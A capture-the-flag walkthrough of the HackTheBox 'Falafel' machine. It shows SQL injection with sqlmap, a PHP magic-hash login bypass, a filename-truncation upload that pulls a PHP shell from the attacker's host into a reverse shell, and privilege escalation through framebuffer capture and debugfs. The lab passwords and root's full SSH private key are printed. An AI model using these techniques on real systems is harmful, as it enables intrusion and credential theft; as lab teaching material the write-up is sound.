# Falafel

As usual start with a fresh nmap:
```
nmap -v -sC -sV -oA nmap -Pn 10.10.10.73
```

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 36:c0:0a:26:43:f8:ce:a8:2c:0d:19:21:10:a6:a8:e7 (RSA)
|   256 cb:20:fd:ff:a8:80:f2:a2:4b:2b:bb:e1:76:98:d0:fb (ECDSA)
|_  256 c4:79:2b:b6:a9:b7:17:4c:07:40:f3:e5:7c:1a:e9:dd (EdDSA)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: B8A9422F95F0D71B26D25CE15206BB79
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry 
|_/*.txt
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Falafel Lovers
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
We can see robots.txt has *.txt in it, so we look for text files on the webserver:

```bash
root@sushi:~# gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.10.73 -x php,txt -t 50                                                                                       

Gobuster v1.2                OJ Reeves (@TheColonial)                                                 
=====================================================                                                 
[+] Mode         : dir                             
[+] Url/Domain   : http://10.10.10.73/             
[+] Threads      : 50                              
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt                       
[+] Status codes : 200,204,301,302,307             
[+] Extensions   : .php,.txt                       
=====================================================                                                 
/images (Status: 301)                              
/index.php (Status: 200)                           
/login.php (Status: 200)                           
/profile.php (Status: 302)                         
/uploads (Status: 301)                             
/header.php (Status: 200)                          
/assets (Status: 301)                              
/footer.php (Status: 200)                          
/upload.php (Status: 302)                          
/css (Status: 301)                                 
/style.php (Status: 200)                           
/js (Status: 301)                                  
/logout.php (Status: 302)                          
/robots.txt (Status: 200)                          
/cyberlaw.txt (Status: 200)              
```


Cyberlaw.txt sticks out here, checking it reveals some relevant info:

```
From: Falafel Network Admin (admin@falafel.htb)
Subject: URGENT!! MALICIOUS SITE TAKE OVER!
Date: November 25, 2017 3:30:58 PM PDT
To: lawyers@falafel.htb, devs@falafel.htb
Delivery-Date: Tue, 25 Nov 2017 15:31:01 -0700
Mime-Version: 1.0
X-Spam-Status: score=3.7 tests=DNS_FROM_RFC_POST, HTML_00_10, HTML_MESSAGE, HTML_SHORT_LENGTH version=3.1.7
X-Spam-Level: ***

A user named "chris" has informed me that he could log into MY account without knowing the password,
then take FULL CONTROL of the website using the image upload feature.
We got a cyber protection on the login form, and a senior php developer worked on filtering the URL of the upload,
so I have no idea how he did it.

Dear lawyers, please handle him. I believe Cyberlaw is on our side.
Dear develpors, fix this broken site ASAP.

	~admin
```
So we see that chris can login as admin with no password, even with the "cyber protections". So let's look at the two parameters on the login form next for bypasses and/or sql injection. We can save the request in burp and feed it to sqlmap:
```
POST /login.php HTTP/1.1
Host: 10.10.10.73
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: http://10.10.10.73/login.php
Cookie: PHPSESSID=cpuuab8qt9v2kptq906qpf8463
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 28

username=chris&password=blah
```

```bash
root@sushi:~# sqlmap -r chris.req --level 5 --risk 3 --string "Wrong identification" -p username --batch --dump --threads 10

--snip--

[18:14:18] [INFO] starting dictionary-based cracking (md5_generic_passwd)                             
[18:14:18] [INFO] starting 2 processes             
[18:14:25] [INFO] cracked password 'juggling' for user 'chris'                                                              [18:14:31] [INFO] postprocessing table dump    
Database: falafel                                  
Table: users                                       
[2 entries]                                        
+----+--------+----------+---------------------------------------------+                              
| ID | role   | username | password                                    |                              
+----+--------+----------+---------------------------------------------+                              
| 1  | admin  | admin    | 0e462096931906507119562988736854            |                              
| 2  | normal | chris    | d4ee02a22fc872e36d9e3751ba72ddc8 (juggling) |                              
+----+--------+----------+---------------------------------------------+  
```
Nice sqlmap even cracks his password for us quickly, now we can login into the falafel blog as chris. 


![](pics/chris.PNG)

We notice hes into hacking and juggling, this leads us to reading about PHP type juggling and magic hashes. PHP does some wierd stuff with the == double equals operator and will convert certain strings to floats in an attempt to be convenient to the developers. This is pretty interesting and unique to these boxes so it was fun to dive into. First read this: https://www.owasp.org/images/6/6b/PHPMagicTricks-TypeJuggling.pdf
Then check out this hackernews thread: https://news.ycombinator.com/item?id=9484757
```
$ echo -n 240610708 | md5sum
0e462097431906509019562988736854  -
$ echo -n QNKCDZO | md5sum
0e830400451993494058024219903391  -
$ echo -n aabg7XSs | md5sum
0e087386482136013740957780965295  
```

What does this mean in our specific case with this machine? When the == double equals is being used and PHP sees anything that starts with "0e", the whole string will be treated as a float and converted to a number 0.0. Notice the admin hash above starts with "0e". Well for md5 here we can use the magic number of 240610708 as our password, PHP then thinks that and the admin hash both equal zero so that will always evaluate as true. The simple fix for this is to use the triple equals "===" instead in your PHP code and it will treat strings and numbers properly. Read yet more about this issue here: https://www.whitehatsec.com/blog/magic-hashes/

So after that we can login as admin then with this password of 240610708. There is a handy word list of these strings for different hash types in the Seclists repo: https://github.com/danielmiessler/SecLists/blob/master/Passwords/PHP-Magic-Hashes.txt


![](pics/admin.PNG)

So all that admin has to work with is this image file upload function via a url, along with a possible hint about limits. If you upload a .png file it seems to be using a wget command to do this:
```bash
root@sushi:~/hackthebox/falafel# nc -nlvp 80       
listening on [any] 80 ...
connect to [10.10.14.11] from (UNKNOWN) [10.10.10.73] 34386
GET /shell.png HTTP/1.1
User-Agent: Wget/1.17.1 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Host: 10.10.14.11
Connection: Keep-Alive
```




After messing around for awhile, we try to upload something with a very long name, and we notice that anything over 236 characters the file name gets truncated down. Knowing this, we can try to create a php file that ends in .php.png and is 240 characeters long which allows the upload function to go through properly and will get saved with a normal .php extension. 

```
POST /upload.php HTTP/1.1
Host: 10.10.10.73
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: http://10.10.10.73/upload.php
Cookie: PHPSESSID=cpuuab8qt9v2kptq906qpf8463
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 40

url=http://10.10.14.11/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.png
```

```html
   <h1>Upload via url:</h1>                        
                                                   
     <div>                                         
                                                   
        <h3>Upload Succsesful!</h3>                
        <div>                                      
        <h4>Output:</h4>                           
        <pre>CMD: cd /var/www/html/uploads/0621-0717_e3c7b4e00ef5f0ce; wget 'http://10.10.14.11/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.png'</pre>                                                                   
        <pre>The name is too long, 240 chars total.                                                   
Trying to shorten...                               
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.       
--2019-06-21 07:17:54--  http://10.10.14.11/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.png                       
Connecting to 10.10.14.11:80... connected.         
HTTP request sent, awaiting response... 200 OK     
Length: 5492 (5.4K) [image/png]                    
Saving to: 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php
 0K .....                                   100% 8.10M=0.001s
```

Nice then we upload the pentestmonkey or whatever php shell you like and we're now www-data on the box:
```bash
listening on [any] 443 ...                         
connect to [10.10.14.11] from (UNKNOWN) [10.10.10.73] 41188                                           
Linux falafel 4.4.0-112-generic #135-Ubuntu SMP Fri Jan 19 11:48:36 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux                                                                                                  
 07:19:12 up 3 days, 23:24,  1 user,  load average: 0.00, 0.00, 0.00                                  
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT                                   
yossi    tty1                      Mon07    3days  0.07s  0.04s -bash                                 
uid=33(www-data) gid=33(www-data) groups=33(www-data)                                                 
/bin/sh: 0: can't access tty; job control turned off                                                  
$                                                  
```



Looking around the files on the webserver we see a password in connection.php that is being reused for ssh:
```php
www-data@falafel:/var/www/html$ cat connection.php
cat connection.php
<?php
   define('DB_SERVER', 'localhost:3306');
   define('DB_USERNAME', 'moshe');
   define('DB_PASSWORD', 'falafelIsReallyTasty');
   define('DB_DATABASE', 'falafel');
   $db = mysqli_connect(DB_SERVER,DB_USERNAME,DB_PASSWORD,DB_DATABASE);
   // Check connection
   if (mysqli_connect_errno())
   {
      echo "Failed to connect to MySQL: " . mysqli_connect_error();
   }
?>
```
So we can ssh in and see this moshe user is part of the video group. This group owns some interesting files, mainly this framebuffer0 which appears to be a video capture we can convert to an image file and view. To learn about framebuffers check out the wikipedia page https://en.wikipedia.org/wiki/Linux_framebuffer
```bash
$ id
uid=1001(moshe) gid=1001(moshe) groups=1001(moshe),4(adm),8(mail),9(news),22(voice),25(floppy),29(audio),44(video),60(games)
$ find / -group 44 -exec ls -ld {} \; 2> /dev/null
crw-rw---- 1 root video 29, 0 Jun 17 07:55 /dev/fb0
crw-rw----+ 1 root video 226, 0 Jun 17 07:55 /dev/dri/card0
crw-rw----+ 1 root video 226, 128 Jun 17 07:55 /dev/dri/renderD128
crw-rw---- 1 root video 226, 64 Jun 17 07:55 /dev/dri/controlD64
```

We can follow this blog post to get a screen shot from a framebuffer: https://www.cnx-software.com/2010/07/18/how-to-do-a-framebuffer-screenshot/. We could also just open it as raw image data in Gimp and set the resolution.

First copy the framebuffer as raw data:
```
moshe@falafel:~$ cat /dev/fb0 > screen.raw
```
Next we need the resolution:
```
moshe@falafel:~$ cat /sys/class/graphics/fb0/virtual_size
1176,885
```
Then we can run this perl script from the above blog post back on kali and create a .png file from the raw data. Another ssh password is in our new image.
```perl
#!/usr/bin/perl -w
 
$w = shift || 240;
$h = shift || 320;
$pixels = $w * $h;
 
open OUT, "|pnmtopng" or die "Can't pipe pnmtopng: $!\n";
 
printf OUT "P6%d %d\n255\n", $w, $h;
 
while ((read STDIN, $raw, 2) and $pixels--) {
   $short = unpack('S', $raw);
   print OUT pack("C3",
      ($short & 0xf800) >> 8,
      ($short & 0x7e0) >> 3,
      ($short & 0x1f) << 3);
}
 
close OUT;
```

```bash
root@sushi:~/hackthebox/falafel# ./iraw2png.pl 1176 885 < screen.raw > fb0.png
pnmtopng: 5 colors found
```

![](pics/yossipasswd.PNG)

So now that we can ssh in as yossi with the password MoshePlzStopHackingMe! what groups are we in? Disks is not a good one. 
```bash 
yossi@falafel:~$ groups
yossi adm disk cdrom dip plugdev lpadmin sambashare
yossi@falafel:~$ 
```
Being in the disk group you can read any file with debugfs so let's read the root users ssh key:
```bash
yossi@falafel:~$ lsblk
NAME   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
sda      8:0    0    8G  0 disk 
├─sda1   8:1    0    7G  0 part /
├─sda2   8:2    0    1K  0 part 
└─sda5   8:5    0 1022M  0 part [SWAP]
sr0     11:0    1 1024M  0 rom  
yossi@falafel:~$ debugfs -w /dev/sda1 -R "cat /root/.ssh/id_rsa"
debugfs 1.42.13 (17-May-2015)
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAyPdlQuyVr/L4xXiDVK8lTn88k4zVEEfiRVQ1AWxQPOHY7q0h
b+Zd6WPVczObUnC+TaElpDXhf3gjLvjXvn7qGuZekNdB1aoWt5IKT90yz9vUx/gf
v22+b8XdCdzyXpJW0fAmEN+m5DAETxHDzPdNfpswwYpDX0gqLCZIuMC7Z8D8Wpkg
BWQ5RfpdFDWvIexRDfwj/Dx+tiIPGcYtkpQ/UihaDgF0gwj912Zc1N5+0sILX/Qd
UQ+ZywP/qj1FI+ki/kJcYsW/5JZcG20xS0QgNvUBGpr+MGh2urh4angLcqu5b/ZV
dmoHaOx/UOrNywkp486/SQtn30Er7SlM29/8PQIDAQABAoIBAQCGd5qmw/yIZU/1
eWSOpj6VHmee5q2tnhuVffmVgS7S/d8UHH3yDLcrseQhmBdGey+qa7fu/ypqCy2n
gVOCIBNuelQuIAnp+EwI+kuyEnSsRhBC2RANG1ZAHal/rvnxM4OqJ0ChK7TUnBhV
+7IClDqjCx39chEQUQ3+yoMAM91xVqztgWvl85Hh22IQgFnIu/ghav8Iqps/tuZ0
/YE1+vOouJPD894UEUH5+Bj+EvBJ8+pyXUCt7FQiidWQbSlfNLUWNdlBpwabk6Td
OnO+rf/vtYg+RQC+Y7zUpyLONYP+9S6WvJ/lqszXrYKRtlQg+8Pf7yhcOz/n7G08
kta/3DH1AoGBAO0itIeAiaeXTw5dmdza5xIDsx/c3DU+yi+6hDnV1KMTe3zK/yjG
UBLnBo6FpAJr0w0XNALbnm2RToX7OfqpVeQsAsHZTSfmo4fbQMY7nWMvSuXZV3lG
ahkTSKUnpk2/EVRQriFjlXuvBoBh0qLVhZIKqZBaavU6iaplPVz72VvLAoGBANj0
GcJ34ozu/XuhlXNVlm5ZQqHxHkiZrOU9aM7umQkGeM9vNFOwWYl6l9g4qMq7ArMr
5SmT+XoWQtK9dSHVNXr4XWRaH6aow/oazY05W/BgXRMxolVSHdNE23xuX9dlwMPB
f/y3ZeVpbREroPOx9rZpYiE76W1gZ67H6TV0HJcXAoGBAOdgCnd/8lAkcY2ZxIva
xsUr+PWo4O/O8SY6vdNUkWIAm2e7BdX6EZ0v75TWTp3SKR5HuobjVKSht9VAuGSc
HuNAEfykkwTQpFTlmEETX9CsD09PjmsVSmZnC2Wh10FaoYT8J7sKWItSzmwrhoM9
BVPmtWXU4zGdST+KAqKcVYubAoGAHR5GBs/IXFoHM3ywblZiZlUcmFegVOYrSmk/
k+Z6K7fupwip4UGeAtGtZ5vTK8KFzj5p93ag2T37ogVDn1LaZrLG9h0Sem/UPdEz
HW1BZbXJSDY1L3ZiAmUPgFfgDSze/mcOIoEK8AuCU/ejFpIgJsNmJEfCQKfbwp2a
M05uN+kCgYBq8iNfzNHK3qY+iaQNISQ657Qz0sPoMrzQ6gAmTNjNfWpU8tEHqrCP
NZTQDYCA31J/gKIl2BT8+ywQL50avvbxcXZEsy14ExVnaTpPQ9m2INlxz97YLxjZ
FEUbkAlzcvN/S3LJiFbnkQ7uJ0nPj4oPw1XBcmsQoBwPFOcCEvHSrg==
-----END RSA PRIVATE KEY-----
```
Does it actually work?
```bash
root@sushi:~/hackthebox/falafel# ssh -i root.key root@10.10.10.73
Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.4.0-112-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.


Last login: Tue May  1 20:14:09 2018 from 10.10.14.4
root@falafel:~# id
uid=0(root) gid=0(root) groups=0(root)
```
Another method that isnt very exciting was to use the rational love priv esc here https://www.exploit-db.com/exploits/43775/ but it has been patched out of the box apparently. Really cool machine with the php type juggling and different privilege escalations, thanks to dm0n and Stylish for coming up with this one on hackthebox. 








